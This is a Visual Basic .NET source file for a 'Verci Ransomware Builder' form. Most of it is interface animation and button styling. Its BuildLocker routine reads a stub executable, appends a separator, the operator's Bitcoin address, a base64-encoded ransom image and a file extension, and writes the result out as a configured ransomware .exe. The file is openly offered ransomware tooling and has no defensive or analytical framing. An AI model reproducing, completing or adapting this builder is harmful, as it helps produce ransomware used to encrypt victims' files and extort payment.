Imports System.IO

Public Class RansomBuilder
    Dim currH As Integer = 46

    Private Sub RansomBuilder_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Me.AllowTransparency = True
        Me.TransparencyKey = Me.BackColor
        Me.Size = New Size(525, 46)
        Me.Label2.Visible = False
        Me.CheckForIllegalCrossThreadCalls = False
        GroupBox1.Visible = False
        GroupBox2.Visible = False
        GroupBox3.Visible = False
        GroupBox1.Location = New Point(42, 140)
        Loading.RansomFinished = False
        Timer1.Start()
        Loadx.Start()
    End Sub







    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        '525; 46 small
        '525; 562 normal
        If Me.Height = 562 Then
            Timer1.Stop()
            SpeakThread("Ransomware Builder has been Activated Sir")
            Label2.Visible = True
            GroupBox1.Visible = True
            connection.Start()

            Exit Sub
        Else
            currH += 86
            Me.Size = New Size(525, currH)
            Me.Refresh()
            Me.StartPosition = FormStartPosition.CenterScreen
        End If
    End Sub



    Private Sub Closer_Tick(sender As System.Object, e As System.EventArgs) Handles Closer.Tick
        '525; 46 small
        '525; 562 normal
        If Me.Height = 46 Then
            Timer1.Stop()
            Me.Close()

            Exit Sub
        Else
            currH -= 86
            Me.Size = New Size(525, currH)
            Me.Refresh()
            Me.StartPosition = FormStartPosition.CenterScreen
        End If
    End Sub

    Dim groupH As Double = 10.0
    Private Sub connection_Tick(sender As System.Object, e As System.EventArgs) Handles connection.Tick
        '320; 367
        '320; 10


        If groupH < 255.0 Then
            groupH += 25.5
            GroupBox1.Size = New Size(471, groupH)
        Else
            connection.Stop()

            Button1.Enabled = False

            Exit Sub
        End If
    End Sub

    Private Sub Hostx_Click(sender As System.Object, e As System.EventArgs) Handles Hostx.Click
        Dim Address = InputBox("Enter Your Bitcoin Address", "Verci Ransomware Builder")
        Hostx.Text = Address
        If Address.Length > 5 Then
            Button1.Enabled = True
            text1 = Hostx.Text
        End If
    End Sub


    Private Sub Button8_MouseHover(sender As System.Object, e As System.EventArgs) Handles Button8.MouseHover
        Button8.ForeColor = Color.Lime
    End Sub

    Private Sub Button8_MouseLeave(sender As System.Object, e As System.EventArgs) Handles Button8.MouseLeave
        Button8.ForeColor = Color.Snow
    End Sub
    Private Sub Button1_MouseHover(sender As System.Object, e As System.EventArgs) Handles Button1.MouseHover
        Button1.ForeColor = Color.Lime
    End Sub

    Private Sub Button1_MouseLeave(sender As System.Object, e As System.EventArgs) Handles Button1.MouseLeave
        Button1.ForeColor = Color.Snow
    End Sub
    Private Sub Button2_MouseHover(sender As System.Object, e As System.EventArgs) Handles Button2.MouseHover
        Button2.ForeColor = Color.Lime
    End Sub

    Private Sub Button2_MouseLeave(sender As System.Object, e As System.EventArgs) Handles Button2.MouseLeave
        Button2.ForeColor = Color.Snow
    End Sub
    Private Sub Button3MouseHover(sender As System.Object, e As System.EventArgs) Handles Button3.MouseHover
        Button3.ForeColor = Color.Lime
    End Sub

    Private Sub Button3MouseLeave(sender As System.Object, e As System.EventArgs) Handles Button3.MouseLeave
        Button3.ForeColor = Color.Snow
    End Sub
    Private Sub Button4MouseHover(sender As System.Object, e As System.EventArgs) Handles Button4.MouseHover
        Button4.ForeColor = Color.Red
    End Sub

    Private Sub Button4MouseLeave(sender As System.Object, e As System.EventArgs) Handles Button4.MouseLeave
        Button4.ForeColor = Color.Yellow
    End Sub
    Private Sub spread_Tick(sender As System.Object, e As System.EventArgs) Handles spread.Tick
        '42; 146
        If groupH < 255.0 Then
            groupH += 25.5
            GroupBox2.Size = New Size(471, groupH)
        Else
            spread.Stop()

            Exit Sub
        End If
    End Sub

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        GroupBox2.Visible = True
        GroupBox2.Location = GroupBox1.Location
        GroupBox1.Visible = False
        groupH = 10.0
        spread.Start()
    End Sub
    Private Sub DrawLoad(g As Graphics, rect As Rectangle, percentage As Single)
        'work out the angles for each arc
        Dim progressAngle = CSng(360 / 100 * percentage)
        Dim remainderAngle = 360 - progressAngle

        'create pens to use for the arcs
        Using progressPen As New Pen(Color.DeepSkyBlue, 6), remainderPen As New Pen(Color.Transparent, 1)
            'set the smoothing to high quality for better output
            g.SmoothingMode = Drawing2D.SmoothingMode.AntiAlias
            'draw the blue and white arcs
            g.DrawArc(progressPen, rect, -90, progressAngle)
            g.DrawArc(remainderPen, rect, progressAngle - 90, remainderAngle)
        End Using

        'draw the text in the centre by working out how big it is and adjusting the co-ordinates accordingly
        Using fnt As New Font(Me.Font.FontFamily, 14)
            Dim text As String = "Verci"
            Dim textSize = g.MeasureString(text, fnt)
            Dim textPoint As New Point(CInt(rect.Left + (rect.Width / 2) - (textSize.Width / 2)), CInt(rect.Top + (rect.Height / 2) - (textSize.Height / 2)))
            'now we have all the values draw the text
            g.DrawString(text, fnt, Brushes.Lime, textPoint)
        End Using
    End Sub
    Private Sub DrawReverse(g As Graphics, rect As Rectangle, percentage As Single)
        'work out the angles for each arc
        Dim progressAngle = CSng(360 / 100 * percentage)
        Dim remainderAngle = 360 - progressAngle

        'create pens to use for the arcs
        Using progressPen As New Pen(Color.DeepSkyBlue, 6), remainderPen As New Pen(Color.Transparent, 1)
            'set the smoothing to high quality for better output
            g.SmoothingMode = Drawing2D.SmoothingMode.AntiAlias
            'draw the blue and white arcs
            g.DrawArc(progressPen, rect, -90, progressAngle)
            g.DrawArc(remainderPen, rect, progressAngle - 90, remainderAngle)
        End Using

        'draw the text in the centre by working out how big it is and adjusting the co-ordinates accordingly

    End Sub
    Dim per As Integer = 0
    Dim per_Reverse As Integer = 100
    Private Sub Loadx_Tick(sender As System.Object, e As System.EventArgs) Handles Loadx.Tick
        If per = 100 Then
            per = 0
        Else
            per += 1
        End If
        If per_Reverse = 0 Then
            per_Reverse = 100
        Else
            per_Reverse -= 1
        End If
        Panel4.Refresh()
    End Sub

    Private Sub Ransom_Paint(sender As System.Object, e As System.Windows.Forms.PaintEventArgs) Handles Panel4.Paint
        If currH = 562 Then
            DrawLoad(e.Graphics, New Rectangle(3, 3, 100, 100), per) '37; 405
            DrawReverse(e.Graphics, New Rectangle(13, 13, 80, 80), per_Reverse) '37; 405
        End If
    End Sub

    Private Sub Loady_Tick(sender As System.Object, e As System.EventArgs) Handles Loady.Tick

        Panel4.Refresh()
    End Sub
    Dim path As String = ""
    Dim CurrentPAth As String
    Dim stub, text1, text2, text3 As String
    Private Sub Button8_Click(sender As System.Object, e As System.EventArgs) Handles Button8.Click
        Dim OpenFileDialog1 As New OpenFileDialog
        With OpenFileDialog1
            .CheckFileExists = True
            .ShowReadOnly = False
            .Filter = "All Files|*.*|Bitmap Files (*)|*.bmp;*.gif;*.jpg"
            .FilterIndex = 2
            If .ShowDialog = DialogResult.OK Then

                PictureBox1.Image = Image.FromFile(.FileName)
                path = .FileName
            End If
        End With
        Label8.Text = path

        CurrentPAth = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
        CurrentPAth &= "\"
        PictureBox1.Image.Save(CurrentPAth & "BackBone.jpg", System.Drawing.Imaging.ImageFormat.Jpeg)

        text2 = Convert.ToBase64String(IO.File.ReadAllBytes(CurrentPAth & "BackBone.jpg"))
        text3 = TextBox1.Text
    End Sub

    Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
        GroupBox3.Visible = True
        GroupBox3.Location = GroupBox2.Location
        GroupBox2.Visible = False
        groupH = 10.0
        Timer2.Start()
    End Sub

    Private Sub Timer2_Tick(sender As System.Object, e As System.EventArgs) Handles Timer2.Tick
        '42; 146
        If groupH < 255.0 Then
            groupH += 25.5
            GroupBox3.Size = New Size(471, groupH)
        Else
            Timer2.Stop()
            PictureBox2.Image = PictureBox1.Image
            Label11.Text = Hostx.Text
            Exit Sub
        End If
    End Sub

    Private Sub Button3_Click(sender As System.Object, e As System.EventArgs) Handles Button3.Click
        'Build Stage
        BuildLocker()
    End Sub

    Private Sub Button4_Click(sender As System.Object, e As System.EventArgs) Handles Button4.Click
        'Cancel
        Closer.Start()
    End Sub

    Const spl As String = "abccba"
    Dim ex As Exception
    Dim s As New SaveFileDialog
    Private Sub BuildLocker()
        Try
            If text1.Length = 0 And text2.Length = 0 And text3.Length = 0 Then
                MsgBox("Complete Information Please At least Bitcoin Address  & your Image & Extension ", MsgBoxStyle.Critical, "Create Ransomware")
            Else

                s.ShowDialog()
                If s.FileName > "" Then

                    Dim temp As String = IO.Path.GetTempPath() & "Stub.exe"


                    ' File.WriteAllBytes(temp, My.Resources.Verci_RansomWare)
                    FileOpen(1, temp, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
                    stub = Space(LOF(1))
                    FileGet(1, stub)
                    FileClose(1)
                    FileOpen(1, s.FileName & ".exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                    FilePut(1, stub & spl & text1 & spl & text2 & spl & TextBox1.Text & ".Saher Blue Eagle")
                    FileClose(1)

                Else

                End If
            End If
        Catch ex As Exception
            MsgBox("Error : " + "Please Make sure you completed the Ransomware information ", MsgBoxStyle.Critical)
        End Try
       

    End Sub
#Region "Drag"

    Dim posX As Integer
    Dim posY As Integer
    Dim drag As Boolean



    Private Sub Header_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseDown
        If e.Button = MouseButtons.Left Then
            drag = True
            posX = Cursor.Position.X - Me.Left
            posY = Cursor.Position.Y - Me.Top
        End If
    End Sub

    Private Sub Header_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseUp
        drag = False
    End Sub

    Private Sub Header_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseMove
        If drag Then
            Me.Top = Cursor.Position.Y - posY
            Me.Left = Cursor.Position.X - posX
        End If
        Me.Cursor = Cursors.Default
    End Sub





#End Region
End Class